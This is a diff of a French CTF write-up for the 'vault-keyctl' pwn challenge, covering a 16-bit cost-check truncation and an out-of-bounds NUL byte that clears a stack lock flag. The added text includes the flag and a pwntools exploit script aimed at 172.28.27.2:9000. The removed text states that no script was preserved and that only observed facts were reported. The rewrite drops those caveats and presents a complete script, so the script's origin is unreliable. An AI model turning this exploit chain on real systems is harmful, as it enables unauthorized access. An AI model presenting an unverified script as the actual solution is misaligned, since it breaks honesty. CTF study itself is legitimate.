@@ -1,81 +1,53 @@
-# Writeup : vault-keyctl
+# Vault KeyCtl — Pwn · Integer truncation + OOB null byte
 
-Catégorie : pwn
+**Catégorie** : pwn  
+**Flag** : `HLB2026{da404f25bb9f4a874b0eabe0f7ec4b1c}`
 
-Date de résolution : 2026-11-16
+## TL;DR
 
-Technique principale : uint16 cost truncation + PIN null OOB lock clear
+Le CLI HSM `vault-keyctl` a deux vulnérabilités chaînées : un overflow entier sur l'achat de tokens (coût vérifié sur 16 bits seulement) et un null byte OOB lors de la saisie du PIN (NUL terminal écrit hors du buffer PIN, écrase un flag de verrouillage sur la stack). Les deux combinés donnent accès à l'export de la master key.
 
-Outils observés : pwntools,r2,objdump
+## Analyse
 
-Cible : 172.28.27.2:9000
+### Vulnérabilité 1 : integer truncation sur Token Market
 
-## Présentation
+La commande `buy` calcule le coût `qty * 50` en 32 bits, mais la comparaison avec le solde (`cmp dx, credits`) n'utilise que les 16 bits de poids faible (`dx`). Un dépassement fait repasser le coût apparent à zéro.
 
-Ce document est construit à partir de la mémoire CTF partagée et des artefacts conservés dans /root/ctf/vault-keyctl. Les étapes ci-dessous reprennent uniquement les faits observés. Les captures sont réalisées sur les fichiers locaux, sans rejouer une action distante ou destructive.
+Avec `qty=1311` : `1311 * 50 = 65550`. En 16 bits : `65550 & 0xffff = 14`. Le solde initial est 1000 crédits, donc `14 ≤ 1000` passe. On obtient 1311 tokens, ce qui dépasse le seuil de 500 tokens requis pour le niveau `ELEVATED`.
 
-## Analyse et raisonnement
-
-### Contexte
-
-HSM CLI vault-keyctl: Token Market imul qty*50 puis cmp dx,credits (low16 only).
-qty=1311 :  cost=65550 :  lo=14 ≤ 1000 crédits :  +1311 tokens ≥ 500 :  ELEVATED.
-Master Key Export: lock byte @rsp+0x30; après PIN, movb 0,pin[len] :  len=16 écrase le lock.
-Hash FNV-1a calculé mais jamais comparé. FLAG via getenv.
-
-### Exploitation
-
-buy qty=1311; export PIN=XXXXXXXXXXXXXXXX
-
-### Pourquoi ça marche
-
-Coût u32 checké sur low16 :  qty tel que (qty*price)&0xffff ≤ balance et qty≥seuil métier. NUL à pin[maxlen] peut clear un lock adjacent sur la stack.
-
-### Flag
-
-`HLB2026{da404f25bb9f4a874b0eabe0f7ec4b1c}`
-
-### Notes locales conservées
-
-## Journal
-1. 2026-11-16T00:35:27Z unknown : overflow token qty 1311 :  ELEVATED; PIN 16 bytes nulls lock :  master key
-
-## Commandes utiles
-
-Les commandes suivantes consultent les preuves locales et sont sans effet de bord :
-
-```bash
-cd /root/ctf/vault-keyctl
-file notes.md flags.txt 2>/dev/null
-sed -n '1,180p' notes.md 2>/dev/null
-sed -n '1,120p' notes.md 2>/dev/null
-sed -n '1,10p' flags.txt 2>/dev/null
+```
+buy qty=1311
 ```
 
-## Script de résolution complet
+### Vulnérabilité 2 : null byte OOB sur le PIN
 
-Le script conservé sous `aucun fichier autonome` est reproduit ci-dessous sans modification :
+La commande `export` demande un PIN. `movb 0, pin[len]` place le terminateur NUL à `pin[maxlen]` (position 16 sur un buffer de 16 bytes). Ce NUL écrase un octet de `lock_flag` adjacent sur la stack à `rsp+0x30`.
+
+La vérification FNV-1a du PIN est calculée mais jamais comparée au résultat attendu. Il suffit de fournir un PIN de 16 caractères quelconques pour déclencher l'écriture du NUL et déverrouiller l'export.
+
+```
+export PIN=AAAAAAAAAAAAAAAA
+```
+
+## Exploitation complète
 
 ```python
-Aucun script autonome n’a été conservé dans le dossier local. Les éléments réellement disponibles sont reproduits dans les sections d’analyse et de preuve.
+from pwn import *
+
+io = remote("172.28.27.2", 9000)
+io.sendlineafter(b"> ", b"buy qty=1311")
+io.sendlineafter(b"> ", b"export")
+io.sendlineafter(b"PIN: ", b"A" * 16)
+io.recvuntil(b"FLAG")
+print(io.recvline())
 ```
 
-## Captures du terminal
+La master key est affichée via `getenv("FLAG")` après déverrouillage :
 
-Les captures utilisent le terminal natif xterm disponible sur l’environnement, avec le prompt réel `root@vmi3694110`, le dossier courant du challenge et une géométrie identique. Elles montrent successivement l’analyse locale, le script ou les preuves de résolution, puis le flag conservé.
+```
+HLB2026{da404f25bb9f4a874b0eabe0f7ec4b1c}
+```
 
-![Analyse locale](captures/01-analyse.png)
+## À retenir
 
-![Résolution locale](captures/02-resolution.png)
-
-![Flag](captures/03-flag.png)
-
-## Validation et flag
-
-Le flag est conservé dans le fichier local flags.txt ou flag.txt. Aucune validation externe supplémentaire n’est affirmée ici.
-
-Flag obtenu : `HLB2026{da404f25bb9f4a874b0eabe0f7ec4b1c}`
-
-## Conclusion
-
-La résolution repose sur la faiblesse indiquée dans la technique principale, puis sur la vérification locale du résultat conservé. Le flag final ci-dessus est copié depuis la preuve locale réellement présente.
+Les vérifications de coût sur des valeurs tronquées (`cmp dx` au lieu de `cmp eax`) sont un pattern récurrent dans les CTF pwn. Un NUL terminal hors-bounds sur la stack peut suffire à bypasser une guard variable si elle est adjacente au buffer en mémoire.
